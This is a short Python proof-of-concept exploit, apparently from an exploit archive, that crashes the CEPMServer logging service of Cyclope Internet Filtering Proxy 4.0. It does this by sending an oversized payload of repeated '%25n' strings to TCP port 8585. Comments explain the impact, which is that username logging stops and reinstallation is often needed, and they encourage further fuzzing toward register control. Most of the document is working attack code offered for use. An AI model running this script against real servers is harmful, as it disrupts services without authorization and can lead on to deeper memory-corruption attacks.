#!/usr/bin/python
 
# Title: Cyclope Internet Filtering Proxy 4.0 - CEPMServer.exe DoS (Poc).
# From: The eh?-Team || The Great White Fuzz (we're not sure yet)
# Found by: loneferret
# Software link: http://www.cyclope-series.com/download/index.aspx?p=2
  
# Date Found: Oct 20th 2011
# Tested on: Windows XP SP3 Professional / Windows Server 2008 R2 Standard
# Tested with: Registered and Unregistered versions
# Nod to the Exploit-DB Team
 
# The Cyclope Internet Filtering Proxy is your basic white & black list website navigation filtering app.
# It will log all of the client's activities such as visited web sites, the time etc.
# There's an optional client application if the administrator wishes to acquire the computer name and user
# information.
 
# The CEPMServer service is what logs user and computer name when one uses the optional client application.
# This service is always on regardless of the client's use. So sending an abonormaly large string will cause a
# crash. It doesn't stop the filtering but it does stop it from logging usernames and computer names.
# Seeing this application is pretty unstable, most often then not you need to re-install Cyclope completely
# to have the logging feature to work again.
 
# No registers are overwriten with this PoC, but it is possible to get ESI & EAX. Just throw SPIKE at it
# and you'll get those 2 registers. I was just too lazy this morning to investigate so...
 
# As always, if someone can make something more out of this PoC go right ahead.
# Have fun,
# loneferret
 
 
import struct
import socket
 
junk = "%25n" * 100000
 
buffer = "<user>loneferret" + junk + "</user><computer>machine</computer><ip>1.1.1.1</ip>\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
print "\nSending evil buffer..."
s.connect(('xxx.xxx.xxx.xxx',8585)) #Enter Cyclope server IP address
s.send(buffer)
s.close()
 
print "\nDone! "

